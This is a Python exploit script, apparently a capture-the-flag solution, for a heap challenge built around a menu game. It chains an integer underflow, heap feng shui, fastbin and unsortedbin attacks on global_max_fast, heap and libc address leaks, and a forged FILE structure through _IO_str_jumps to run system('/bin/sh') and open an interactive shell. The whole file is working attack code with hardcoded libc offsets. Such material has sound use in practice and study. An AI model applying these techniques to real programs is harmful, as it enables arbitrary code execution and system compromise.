#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def recruite(size:(tuple, list), name:(tuple, list)):
    p.sendlineafter("Give me your choice:\n", "1")
    p.sendlineafter("How many servents do you want to rescruit?\n", str(len(size)))
    for i in range(len(size)):
        p.sendlineafter("Input the name's size of this servent:\n", str(size[i]))
        p.sendafter("Input the name of this servent:\n", name[i])


def expel(idx:int):
    p.sendlineafter("Give me your choice:\n", "2")
    p.sendlineafter("Tell me his index number:\n", str(idx))
    p.recvuntil("Ok, I'll kill ")
    msg = p.recvline()
    info("msg recv: {}".format(msg))
    return msg


def buy_weapon(weapon_type:int):
    p.sendlineafter("Give me your choice:\n", "3")
    p.sendlineafter("2.Excalibur      --90000yuan\n", str(weapon_type))


def attack_boss(use_big_weapon='n'):
    p.sendlineafter("Give me your choice:\n", "4")
    msg = p.recvline()
    if  b"Do you want to use excalibur?" in msg:
        p.sendline(use_big_weapon)


context.arch="amd64"
# 搞钱
p.sendlineafter("How much money do you want?\n", "-1")
p.sendlineafter("Give me your choice:\n", "1")
p.sendlineafter("How many servents do you want to rescruit?\n", str(-10000))

buy_weapon(2)

# 为堆风水布局
recruite([0x18, 0x18, 0x18, 0x2000], [flat(0, 0x21), flat(0, 0x21), flat(0, 0x21), flat({0x400:[[0, 0x21, 0, 0] * 2], 0x1410:[[0, 0x21, 0, 0] * 2]}, length=0x1800)])

expel(1)

expel(1)

# 泄露堆地址 
leak_addr = expel(1)

heap_base_addr = u64(leak_addr[:6].ljust(8, b"\x00")) - 0x2a0

log_address("heap_base_addr", heap_base_addr)

# fastbin attack
for _ in range(5):
    expel(1)

expel(0)
expel(1)
expel(0)

recruite([0x18], [flat([0, 0x21, heap_base_addr + 0x280], length=0x18)])

# change size
recruite([0x40, 0x18], ["a", flat(0, 0x71)])

for i in range(8):
    expel(1)

# 改完size后得到一个大的chunk，释放它
expel(0)

recruite([0x60], [flat({0:heap_base_addr + 0x2e0, 0x30: [0, 0x471]})])

expel(2)

# 泄露libc地址
leak_addr = expel(1)
libc_base_addr = u64(leak_addr[:6].ljust(8, b"\x00")) - 0x3ebca0
log_address("libc_base_addr", libc_base_addr)

libc.address = libc_base_addr

expel(0)

# unsortedbin attack
global_max_fast_offset = 0x3ed940
recruite([0x60], [flat({0x30:[0, 0x471, 0, libc_base_addr + global_max_fast_offset - 0x10]}, filler="\x00")])

expel(0)

str_jumps_offset = 0x3e8360
lock_offset = 0x3ed8c0
bin_sh_offset = 0x1b3e9a

payload = flat({
    0x30: [0, 0x1441],
    0x30+0x80: 0,
    0x30+0x88: libc_base_addr + lock_offset, # lock
    0x30+0xc0: 0,
    0x30+0x28: 0xffffffffffffff, # write_ptr
    0x30+0xd8: libc_base_addr + str_jumps_offset - 8, # IO_str_jumps
    0x30+0x38: libc_base_addr + bin_sh_offset, # /bin/sh
    0x30+0xe8: libc.sym['system']
}, filler="\x00")

recruite([0x460], [payload])

# 覆盖掉_IO_list_all
expel(3)

# 执行exit
attack_boss()

p.interactive()
